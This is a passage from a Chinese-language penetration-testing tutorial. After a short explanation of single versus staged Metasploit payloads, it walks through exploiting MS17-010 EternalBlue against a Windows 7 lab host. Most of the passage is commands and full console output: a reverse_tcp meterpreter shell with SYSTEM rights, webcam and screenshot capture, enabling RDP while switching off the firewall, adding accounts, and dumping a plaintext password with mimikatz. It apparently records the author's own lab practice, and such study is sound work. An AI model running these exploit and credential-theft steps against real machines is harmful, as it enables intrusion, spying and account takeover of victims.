上面说了这么多，可能大家看起来比较费劲难以理解，其实简单的理解就是说payload攻击载荷有2个大的类型：
**（1） 独立体（single）**
从这个英文单词single,就可以大概知道这类payload是个独立，单独的意思，其实在结合定义我们就可以看出，攻击载荷一般做两件事情
一、就是建立目标主机与攻击主机之间的网络连接；
二、就是在连接建立的基础上获取目标主机的控制权限，即获取可供操作的shell。
**（2）结合体payload**
在理解了一个完整的payload是有两部分组成的基础上，我们可以理解我们这里所说的结合体了，其实就是将原本的single独立体分割为了两个部分：“传输器载荷”与“传输体载荷”（stages
& stagers）
比如“windows/meterpreter/reverse_tcp”是由一个传输器载荷（reverse_tcp）和一个传输体载荷（meterpreter）所组成的，其功能等价于独立攻击载荷“windows/shell_reverse_tcp”
**6.3 meterpreter 攻击载荷实战**
我们这里就使用MS17-010漏洞渗透模块结合meterpreter攻击载荷模块进行一次实战演练,通过永恒之蓝漏洞我们来获取一个meterpreter，顺道看meterpreter功能的强大之处。
其他攻击流程与前面基本相同，唯独多了一个配置 payload攻击载荷的过程，具体配置如下。
**6.3.1 攻击载荷配置过程**
调用exploit 攻击
    use exploit/windows/smb/ms17_010_eternalblue 
    set rhost 192.168.1.112
配置攻击载荷
    set payload windows/x64/meterpreter/reverse_tcp 
    set lhost 192.168.1.118
发起攻击
    exploit
获取shell
    getuid
**6.3.2 具体实操过程记录**
    1.msf > use exploit/windows/smb/ms17_010_eternalblue          # 调用ms17-010永恒之蓝漏洞攻击模块
    2.msf exploit(ms17_010_eternalblue) > set rhost 192.168.1.112 # 设定攻击目标 192.168.1.112
    3.rhost => 192.168.1.112
    4.msf exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp # 调用反弹的攻击载荷 
    5.payload => windows/x64/meterpreter/reverse_tcp
    6.msf exploit(ms17_010_eternalblue) > set lhost 192.168.1.118 # 设定将meterpreter 反弹给192.168.1.118
    7.lhost => 192.168.1.118
    8.msf exploit(ms17_010_eternalblue) > show options  # 查询攻击参数设置
    9.
    10.Module options (exploit/windows/smb/ms17_010_eternalblue):
    11.
    12.   Name                Current Setting  Required  Description
    13.   ----                ---------------  --------  -----------    14.   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
    15.   GroomDelta          5                yes       The amount to increase the groom count by per try.
    16.   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
    17.   ProcessName         spoolsv.exe      yes       Process to inject payload into.
    18.   RHOST               192.168.1.112    yes       The target address
    19.   RPORT               445              yes       The target port (TCP)
    20.   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
    21.   VerifyTarget        true             yes       Check if remote OS matches exploit Target.
    22.
    23.
    24.Payload options (windows/x64/meterpreter/reverse_tcp):
    25.
    26.   Name      Current Setting  Required  Description
    27.   ----      ---------------  --------  -----------    28.   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
    29.   LHOST     192.168.1.118    yes       The listen address
    30.   LPORT     4444             yes       The listen port
    31.
    32.
    33.Exploit target:
    34.
    35.   Id  Name
    36.   --  ----    37.   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
    38.
    39.
    40.msf exploit(ms17_010_eternalblue) > exploit     # 发起攻击
    41.
    42.[*] Started reverse TCP handler on 192.168.1.118:4444 
    43.[*] 192.168.1.112:445 - Connecting to target for exploitation.
    44.[+] 192.168.1.112:445 - Connection established for exploitation.
    45.[+] 192.168.1.112:445 - Target OS selected valid for OS indicated by SMB reply
    46.[*] 192.168.1.112:445 - CORE raw buffer dump (23 bytes)
    47.[*] 192.168.1.112:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
    48.[*] 192.168.1.112:445 - 0x00000010  74 65 20 36 2e 31 00                             te 6.1         
    49.[+] 192.168.1.112:445 - Target arch selected valid for OS indicated by DCE/RPC reply
    50.[*] 192.168.1.112:445 - Trying exploit with 12 Groom Allocations.
    51.[*] 192.168.1.112:445 - Sending all but last fragment of exploit packet
    52.[*] 192.168.1.112:445 - Starting non-paged pool grooming
    53.[+] 192.168.1.112:445 - Sending SMBv2 buffers
    54.[+] 192.168.1.112:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
    55.[*] 192.168.1.112:445 - Sending final SMBv2 buffers.
    56.[*] 192.168.1.112:445 - Sending last fragment of exploit packet!
    57.[*] 192.168.1.112:445 - Receiving response from exploit packet
    58.[+] 192.168.1.112:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
    59.[*] 192.168.1.112:445 - Sending egg to corrupted connection.
    60.[*] 192.168.1.112:445 - Triggering free of corrupted buffer.
    61.[*] Sending stage (1189423 bytes) to 192.168.1.112
    62.[*] Meterpreter session 1 opened (192.168.1.118:4444 -> 192.168.1.112:49177) at 2017-06-07 13:42:17 +0800
    63.[+] 192.168.1.112:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    64.[+] 192.168.1.112:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    65.[+] 192.168.1.112:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    66.
    67.meterpreter > getuid    # 查询当前用户权限为SYSTEM,获取到到最高权限
    68.Server username: NT AUTHORITYSYSTEM
    69.meterpreter > sysinfo   # 系统信息查询，当前系统为 Windows7
    70.Computer        : CHINAMAN-PC
    71.OS              : Windows 7 (Build 7600).
    72.Architecture    : x64
    73.System Language : zh_CN
    74.Domain          : WORKGROUP
    75.Logged On Users : 0
    76.Meterpreter     : x64/windows
    77.meterpreter >
**6.3.3 meterpreter 功能展现**
（1）桌面抓图
1\. meterpreter > screenshot
（2）视频开启
1\. meterpreter > webcam_scream
（3）开启远程桌面
1\. > meterpreter > run post/windows/manage/enable_rdp
2\. 此命令可以帮我们一建开启远程桌面，并帮我们关闭防火墙，真的牛xxx.
注：一开始使用命令 run getgui -u admin -p passw0rd
没能开启远程RDP桌面，后来才查询到上面这个攻击脚本。当然并不是说，就不能用哦。
（4）添加账号
直接进入系统shell,添加账号（结果失败）
    1.> shell
    2.> net user test 123 /add
3\. … #
一直没有回显，怀疑是由于安装了360导致的，后来进过验证的确是这原因，所有说安装个360还是很有用的，不要总是说人家是流氓软件，不是打广告哈,切实感受…
（5）获取系统管理密码
想直接添加账号进行提权，前面操作是不了，那么我们现在就出杀手锏，直接使用mimikatz来获取系统管理账号的密码。
第一步：载入mimikatz
1\. meterpreter > load mimikatz
第二步：使用命令wdigest获取密码
    1.meterpreter > wdigest
    2.[+] Running as SYSTEM
    3.[*] Retrieving wdigest credentials
    4.wdigest credentials
    5.===================
    6.
    7.AuthID    Package    Domain        User           Password
    8.------    -------    ------        ----           --------    9.0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
    10.0;996     Negotiate  WORKGROUP     CHINAMAN-PC$   
    11.0;47327   NTLM                                    
    12.0;999     NTLM       WORKGROUP     CHINAMAN-PC$   
    13.0;636147  NTLM       ChinaMan-PC   ChinaMan       mima-009
    14.>
注：Mimikatz 的命令帮助：
    1.Mimikatz Commands
    2.=================
    3.
    4.    Command           Description
    5.    -------           -----------    6.    kerberos          Attempt to retrieve kerberos creds
    7.    livessp           Attempt to retrieve livessp creds
    8.    mimikatz_command  Run a custom command
    9.    msv               Attempt to retrieve msv creds (hashes)
    10.    ssp               Attempt to retrieve ssp creds
    11.    tspkg             Attempt to retrieve tspkg creds
    12.    wdigest           Attempt to retrieve wdigest creds
（6）远程桌面连接之
另开启一个terminal，使用名rdesktop 连接远程桌面
    1.root# rdesktop 192.168.1.112 -u user -p passw0rd
有关meterpreter
的功能还有很多，这里就不足做过多的说明了，就是简单记录下本次实战演练过程中遇到的各种问题和小技能有关其他的功能使用可以参考其他文档做进一步的学习。
**参考学习**